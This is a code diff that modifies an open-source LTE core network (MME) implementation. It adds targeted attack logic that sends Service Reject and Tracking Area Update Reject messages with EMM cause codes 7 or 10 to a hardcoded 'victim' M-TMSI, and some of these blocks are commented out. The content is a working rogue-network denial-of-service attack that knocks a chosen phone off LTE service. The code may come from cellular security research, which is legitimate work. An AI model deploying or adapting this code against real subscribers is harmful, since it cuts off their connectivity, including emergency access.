@@ -400,7 +400,15 @@ bool nas::handle_guti_attach_request_unknown_ue(uint32_t                        
   s1ap->add_ue_to_enb_set(enb_sri->sinfo_assoc_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
 
   // Send Identity Request
+  // MODIFIED
+  /*
+  nas_log->console("Send Service Reject with EMM Cause No.7 instead of Identity Request\n");
   nas_tx = pool->allocate();
+  nas_ctx->pack_service_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
+  s1ap->send_downlink_nas_transport(nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx, nas_ctx->m_ecm_ctx.enb_sri);
+  pool->deallocate(nas_tx);
+  */
+
   nas_ctx->pack_identity_request(nas_tx);
   s1ap->send_downlink_nas_transport(
       nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx, nas_ctx->m_ecm_ctx.enb_sri);
@@ -609,6 +617,7 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
     return true;
   }
 
+  uint32_t victim_m_tmsi = 0xd02a0f8b;
   nas* nas_ctx = s1ap->find_nas_ctx_from_imsi(imsi);
   if (nas_ctx == NULL || nas_ctx->m_emm_ctx.state != EMM_STATE_REGISTERED) {
     nas_log->console("UE is not EMM-Registered.\n");
@@ -623,6 +632,22 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
     pool->deallocate(nas_tx);
     return true;
   }
+  // MODIFIED
+  /*
+  else if (m_tmsi == victim_m_tmsi) {
+    nas_log->console("Sending Service Reject message to victim UE with EMM message No.7\n");
+    nas nas_tmp(args, itf, nas_log);
+    nas_tmp.m_ecm_ctx.enb_ue_s1ap_id = enb_ue_s1ap_id;
+    nas_tmp.m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
+
+    srslte::byte_buffer_t* nas_tx = pool->allocate();
+    nas_tmp.pack_service_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
+    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
+    pool->deallocate(nas_tx);
+    return true;
+  }
+  */
+
   emm_ctx_t* emm_ctx = &nas_ctx->m_emm_ctx;
   ecm_ctx_t* ecm_ctx = &nas_ctx->m_ecm_ctx;
   sec_ctx_t* sec_ctx = &nas_ctx->m_sec_ctx;
@@ -806,21 +831,25 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
   // MODIFIED
   //nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
 
-  uint32_t victim_m_tmsi = 0xc8845edb;
+  uint32_t victim_m_tmsi = 0xd02a0f8b;
 
-  nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
+  //nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
   if(m_tmsi == victim_m_tmsi) {
+    nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
     nas_log->console("Sending TAU Reject with EMM Message 7\n");
-    nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED); // EMM Message No.7
+    nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED); // EMM Message No.7
     s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
     pool->deallocate(nas_tx);
   }
+ /* 
   else {
-    nas_log->console("Sendint TAU Reject with EMM Message 10\n");
+    nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
+    nas_log->console("Sending TAU Reject with EMM Message 10\n");
     nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED); // EMM Message No.10
     s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
     pool->deallocate(nas_tx);
   }
+  */
 
   return true;
 }
